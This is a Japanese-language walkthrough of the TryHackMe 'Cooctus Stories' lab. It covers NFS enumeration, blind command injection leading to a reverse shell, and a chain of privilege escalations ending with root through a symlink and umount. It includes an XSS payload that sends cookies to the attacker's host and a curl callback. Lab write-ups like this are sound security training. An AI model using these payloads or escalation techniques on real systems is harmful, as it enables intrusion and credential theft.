# Cooctus Stories CTF

https://tryhackme.com/room/cooctusadventures

## Enumeration

```shell
TARGET=10.201.49.219
sudo bash -c "echo $TARGET   cooctu.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http-proxy
35213/tcp open  unknown
43691/tcp open  unknown
57101/tcp open  unknown
57111/tcp open  unknown
```

```sh
sudo nmap -sS -sV -p22,111,2049,8080,35213,43691,57101,57111 $TARGET

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
35213/tcp open  nlockmgr 1-4 (RPC #100021)
43691/tcp open  mountd   1-3 (RPC #100005)
57101/tcp open  mountd   1-3 (RPC #100005)
57111/tcp open  mountd   1-3 (RPC #100005)
```

### NFS

ディレクトリを発見

```sh
$ showmount -e $TARGET
Export list for 10.201.49.219:
/var/nfs/general *
```

マウントして1ファイル取得。何かの認証情報。

```sh
$ sudo mount -t nfs $TARGET:/var/nfs/general /mnt

$ ls -al /mnt          
total 12
drwxr-xr-x  2 nobody nogroup 4096 Nov 22  2020 .
drwxr-xr-x 18 root   root    4096 Apr 23  2025 ..
-rw-r--r--  1 root   root      31 Nov 22  2020 credentials.bak
```

### ディレクトリ列挙

cat, login を発見。入手した認証情報を使ってログインできた。

```sh
dirb http://$TARGET:8080

---- Scanning URL: http://cooctu.thm:8080/ ----
+ http://cooctu.thm:8080/cat (CODE:302|SIZE:219)                                                                     
+ http://cooctu.thm:8080/login (CODE:200|SIZE:556)
```

## C.A.T

エクスプロイトをテストするページが表示されたが、入力したものがそのまま表示されるだけで、どういう機能かよくわからない。

`Please bear in mind, some functionality is still under development in the current version.` と、何か隠し機能のようなものが示唆されている。

### パラメータファジング

パラメータを探してみたが、何も出なかった。

```sh
ffuf -u 'http://cooctu.thm:8080/cat' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -X POST -d 'payload=cat&FUZZ=1' -fw 3
```

### py

pyファイルを検索してみたが何も出なかった。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,py -u http://cooctu.thm:8080 -w ./dirlist.txt -t 64 -k
/cat                  (Status: 200) [Size: 690]
/login                (Status: 200) [Size: 556]
```

### script

javascriptを入力すると実行されたが、悪用は難しいと思われる。

```js
<script>alert('hello')</script>
```

通信させるコードを入力したが自分以外のリクエストは来なかったので、ボットが実行していることはなさそう。

```js
<script>document.write('<img src="http://10.11.146.32:8000/' + document.cookie + '">')</script>
```

### コマンド実行

curlコマンドを入力したら、画面表示は変わらないがリクエストが送信されていることに気付いた。

```
curl http://10.11.146.32:8000/test
```



```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.49.219 - - [10/Nov/2025 11:15:45] code 404, message File not found
10.201.49.219 - - [10/Nov/2025 11:15:45] "GET /test HTTP/1.1" 404 -
```

シンプルにPython3のリバースシェルを入力したら成功した。

```sh
$ nc -lnvp 8888     
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.49.219] 47372
$ id
id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)
```

## 権限昇格１ (szymex)

```sh
paradox@cchq:~$ ls -al /home
total 24
drwxr-xr-x  6 root    root    4096 Jan  2  2021 .
drwxr-xr-x 24 root    root    4096 Feb 20  2021 ..
drwxr-xr-x  5 paradox paradox 4096 Feb 22  2021 paradox
drwxr-xr-x  5 szymex  szymex  4096 Feb 22  2021 szymex
drwxr-xr-x  9 tux     tux     4096 Feb 20  2021 tux
drwxr-xr-x  7 varg    varg    4096 Feb 20  2021 varg
```

次は、szymex

```sh
paradox@cchq:~$ ls -al /home/szymex
total 44
drwxr-xr-x 5 szymex szymex 4096 Feb 22  2021 .
drwxr-xr-x 6 root   root   4096 Jan  2  2021 ..
lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
-rw-r--r-- 1 szymex szymex 3865 Feb 20  2021 .bashrc
drwx------ 2 szymex szymex 4096 Jan  2  2021 .cache
drwx------ 3 szymex szymex 4096 Jan  2  2021 .gnupg
drwxrwxr-x 3 szymex szymex 4096 Jan  2  2021 .local
-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
-rw------- 1 szymex szymex   38 Feb 22  2021 user.txt
```

ノート。

```sh
paradox@cchq:/home/szymex$ cat ./note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
```

encode関数をそのまま使うことでパスワードを復元できる。（ROT13だから）

```python
paradox@cchq:/home/szymex$ cat ./SniffingCat.py 
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc
```

cronで1分ごとに実行されているが、これを使って権限昇格はできないと思われる。

```sh
paradox@cchq:/home/szymex$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   szymex  /home/szymex/SniffingCat.py
```

encode関数で復元したパスワードで、szymexとしてSSH接続できた。

## 権限昇格２ (tux)

次は tux

```sh
szymex@cchq:/home/tux$ ls -al
total 56
drwxr-xr-x 9 tux  tux     4096 Feb 20  2021 .
drwxr-xr-x 6 root root    4096 Jan  2  2021 ..
lrwxrwxrwx 1 tux  tux        9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tux  tux      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tux  tux     3772 Feb 20  2021 .bashrc
drwx------ 3 tux  tux     4096 Nov 21  2020 .cache
drwx------ 4 tux  tux     4096 Feb 20  2021 .config
drwx------ 5 tux  tux     4096 Feb 20  2021 .gnupg
-rw------- 1 tux  tux       58 Feb 20  2021 .lesshst
drwx------ 5 tux  tux     4096 Jan  2  2021 .local
-rw-rw-r-- 1 tux  tux      630 Jan  2  2021 note_to_every_cooctus
drwx------ 2 tux  tux     4096 Feb 20  2021 .ssh
-rw-r--r-- 1 tux  tux        0 Feb 20  2021 .sudo_as_admin_successful
drwxrwx--- 2 tux  testers 4096 Feb 20  2021 tuxling_1
drwxrwx--- 2 tux  testers 4096 Feb 20  2021 tuxling_3
-rw------- 1 tux  tux       38 Feb 20  2021 user.txt
```

ファイル一覧

```sh
szymex@cchq:/home/tux$ find .
.
./tuxling_3
./tuxling_3/note
./.bash_history
./.local
find: ‘./.local’: Permission denied
./.config
find: ‘./.config’: Permission denied
./.ssh
find: ‘./.ssh’: Permission denied
./user.txt
./.cache
find: ‘./.cache’: Permission denied
./.sudo_as_admin_successful
./.bash_logout
./tuxling_1
./tuxling_1/nootcode.c
./tuxling_1/note
./.gnupg
find: ‘./.gnupg’: Permission denied
./.bashrc
./note_to_every_cooctus
./.lesshst
```

3つの試練があるとのこと。

```sh
szymex@cchq:/home/tux$ cat ./note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
```

### 1

```sh
szymex@cchq:/home/tux$ cat cat ./tuxling_1/note
cat: cat: No such file or directory
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```

```c
szymex@cchq:/home/tux$ cat ./tuxling_1/nootcode.c 
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "[REDACTED]"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "[REDACTED]"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "[REDACTED]"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

`#define Nooot nuut` の部分がエラーになるので、自分のマシン上ではコンパイルエラーになった。ターゲットマシン上ではコンパイルできたが、フラグメントは表示されなかった。

```sh
szymex@cchq:/home/tux$ /home/szymex/noot
What does the penguin say?
NOOT!
```

マクロを手作業で置き換えたらフラグメントが出てきた。

### 2

/media の中で発見。

```sh
szymex@cchq:/home/tux$ find / -name 'tuxling_2' 2>/dev/null
/media/tuxling_2
```

```sh
szymex@cchq:/home/tux$ ls -al /media/tuxling_2/
total 20
drwxrwx--- 2 tux  testers 4096 Feb 20  2021 .
drwxr-xr-x 3 root root    4096 Feb 20  2021 ..
-rw-rw-r-- 1 tux  testers  740 Feb 20  2021 fragment.asc
-rw-rw---- 1 tux  testers  280 Jan  2  2021 note
-rw-rw-r-- 1 tux  testers 3670 Feb 20  2021 private.key
```

```sh
szymex@cchq:/media/tuxling_2$ cat note
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

GPG復号

```sh
szymex@cchq:/media/tuxling_2$ gpg --import ./private.key 
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

szymex@cchq:/media/tuxling_2$ gpg --decrypt ./fragment.asc 
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: [REDACTED]
```

### 3

そのまま。

```sh
szymex@cchq:/home/tux$ cat ./tuxling_3/note
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: [REDACTED]

Combine them all and visit the station.
```

フラグメントを結合したらMD5ハッシュになり、crackstationでパスワードを入手。tuxとしてSSH接続できた。

## 権限昇格３ (varg)

CooctOS.py に SUID が付いている。

```sh
tux@cchq:/home/varg$ ls -al
total 48
drwxr-xr-x  7 varg varg      4096 Feb 20  2021 .
drwxr-xr-x  6 root root      4096 Jan  2  2021 ..
lrwxrwxrwx  1 varg varg         9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 varg varg       220 Jan  2  2021 .bash_logout
-rw-r--r--  1 varg varg      3771 Jan  3  2021 .bashrc
drwx------  2 varg varg      4096 Jan  3  2021 .cache
-rwsrws--x  1 varg varg      2146 Feb 20  2021 CooctOS.py
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 cooctOS_src
-rw-rw-r--  1 varg varg        47 Feb 20  2021 .gitconfig
drwx------  3 varg varg      4096 Jan  3  2021 .gnupg
drwxrwxr-x  3 varg varg      4096 Jan  3  2021 .local
drwx------  2 varg varg      4096 Feb 20  2021 .ssh
-rw-------  1 varg varg        38 Feb 20  2021 user.txt
```

sudo まで付いている。

```sh
tux@cchq:/home/varg$ sudo -l
Matching Defaults entries for tux on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
```

tux は os_tester グループなので、cooctOS_src を見られる。git ディレクトリであることが分かる。

```sh
tux@cchq:/home/varg$ id
uid=1000(tux) gid=1000(tux) groups=1000(tux),1004(testers),1005(os_tester)

tux@cchq:/home/varg$ ls -al ./cooctOS_src/
total 44
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 .
drwxr-xr-x  7 varg varg      4096 Feb 20  2021 ..
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin
drwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 games
drwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git
drwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib
drwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var
```

コミットで削除された部分

```python
#!/usr/bin/python3

import time
import os;
import pty;

#print(chr(27)+ "[2J")
logo = """\033[1;30;49m
 ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝\033[1;37;49m██╔═══██╗██╔════╝\033[1;30;49m
██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
 ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
"""
print(logo)
print("                       LOADING")
print("[", end='')

for i in range(0,60):
    #print(chr(27)+ "[2J")
    #print(logo)
    #print("                       LOADING")
    print("[", end='')
    print("=" * i, end='')
    print("]")
    time.sleep(0.02)
    print("\033[A\033[A")

print("\032")
print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")

print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")

print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")

print("CooctOS 13.3.7 LTS cookie tty1")
uname = input("\ncookie login: ")
pw = input("Password: ")

for i in range(0,2):
    if pw != "[REDACTED]":
        pw = input("Password: ")
    else:
        if uname == "varg":
            os.setuid(1002)
            os.setgid(1002)
            pty.spawn("/bin/rbash")
            break
        else:
            print("Login Failed")
            break
```

パスワードをそのまま使い、昇格成功

```sh
tux@cchq:/home/varg$ sudo -u varg /home/varg/CooctOS.py

 ██████╗ ██████╗  ██████╗  ██████╗████████╗ ██████╗ ███████╗                                                                                                                                                                              
██╔════╝██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔════╝                                                                                                                                                                              
██║     ██║   ██║██║   ██║██║        ██║   ██║   ██║███████╗                                                                                                                                                                              
██║     ██║   ██║██║   ██║██║        ██║   ██║   ██║╚════██║                                                                                                                                                                              
╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   ╚██████╔╝███████║                                                                                                                                                                              
 ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚══════╝                                                                                                                                                                              
                                                                                                                                                                                                                                          
                       LOADING                                                                                                                                                                                                            
▒===========================================================]                                                                                                                                                                             
[  OK  ] Cold boot detected. Flux Capacitor powered up                                                                                                                                                                                    
[  OK  ] Mounted Cooctus Filesystem under /opt
[  OK  ] Finished booting sequence
CooctOS 13.3.7 LTS cookie tty1

cookie login: varg
Password: [REDACTED]
varg@cchq:/home/varg$ id
uid=1002(varg) gid=1002(varg) groups=1002(varg),1005(os_tester)
```

## 権限昇格４ (root)

umount を root として実行できる。

```sh
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

マウントポイントを確認

```sh
varg@cchq:~$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo    /       ext4    defaults        0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3  /boot   ext4    defaults        0 0
#/swap.img      none    swap    sw      0 0
/home/varg/cooctOS_src  /opt/CooctFS    none    defaults,bind   0 0
```

アンマウントを実行

```sh
varg@cchq:~$ sudo /bin/umount /opt/CooctFS

varg@cchq:~$ ls -al /opt/CooctFS
total 12
drwxr-xr-x 3 root root 4096 Feb 20  2021 .
drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
drwxr-xr-x 5 root root 4096 Feb 20  2021 root
```

root ディレクトリを発見したが囮だった。ただ、少し時間を空けたら再びマウントされていたのでスケジュールでマウント実行されていると思われる。

```sh
varg@cchq:~$ ls -al /opt/CooctFS
total 12
drwxr-xr-x 3 root root 4096 Feb 20  2021 .
drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
drwxr-xr-x 5 root root 4096 Feb 20  2021 root
varg@cchq:~$ ls /opt/CooctFS/root
root.txt
varg@cchq:~$ cat /opt/CooctFS/root/root.txt
hmmm...
No flag here. You aren't root yet.
```

/home/varg/cooctOS_src を /root へのシンボリックリンクにしてみた。

```sh
varg@cchq:~$ rm -rf ./cooctOS_src/; ln -s /root /home/varg/cooctOS_src

varg@cchq:~$ sudo /bin/umount /opt/CooctFS
```

/root がマウントされた。SSH秘密鍵を入手し、root としてSSH接続可能。

```sh
varg@cchq:~$ ls -al /opt/CooctFS/root
total 28
drwxr-xr-x 5 root root 4096 Feb 20  2021 .
drwxr-xr-x 3 root root 4096 Feb 20  2021 ..
lrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Feb 20  2021 .bashrc
drwx------ 3 root root 4096 Feb 20  2021 .cache
drwxr-xr-x 3 root root 4096 Feb 20  2021 .local
-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
drwxr-xr-x 2 root root 4096 Feb 20  2021 .ssh
```



## 振り返り

- 最初のブラインドコマンド実行を見破れずかなり時間をかけてしまった。Web攻撃でコマンド実行を試すとき、表示が変わらなくてもブラインドで実行される場合があることに注意する。
